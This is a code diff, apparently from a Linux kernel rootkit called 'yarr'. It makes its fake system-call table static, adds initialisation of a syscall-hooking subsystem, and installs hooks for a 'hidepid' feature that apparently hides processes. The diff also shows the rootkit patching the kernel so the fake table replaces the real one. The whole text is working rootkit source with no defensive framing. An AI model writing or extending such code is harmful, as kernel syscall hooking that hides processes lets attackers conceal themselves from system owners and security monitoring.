@@ -13,7 +13,7 @@
 #include "hook_syscalls.h"
 
 // Our fake sys_call_table.
-unsigned long __fake_sct[__NR_syscall_max+1];
+static unsigned long __fake_sct[__NR_syscall_max+1];
 
 /**
  * Internal. Does all the work needed to locate the 64-bit sys_call_table and
@@ -86,8 +86,15 @@ int __hook_syscall_table_64(void) {
     // Install our entry point.
     __fake_sct[YARR_VECTOR] = (unsigned long)entry_yarrcall;
 
-    // Hook all system calls we need to give a special treatment.
-    err = hook_syscalls(__fake_sct, sys_call_table);
+    // Initialize the syscall hooking subsystem.
+    err = init_hook_syscalls(__fake_sct, sys_call_table);
+    if (err) {
+        yarr_log("error initializing hook syscall subsystem");
+        return -1;
+    }
+
+    // Install syscall hooks for hidepid subsystem.
+    hidepid_install_syscalls();
 
     // Now we patch the instruction from where we got the sys_call_table
     // with our fake sys_call_table.
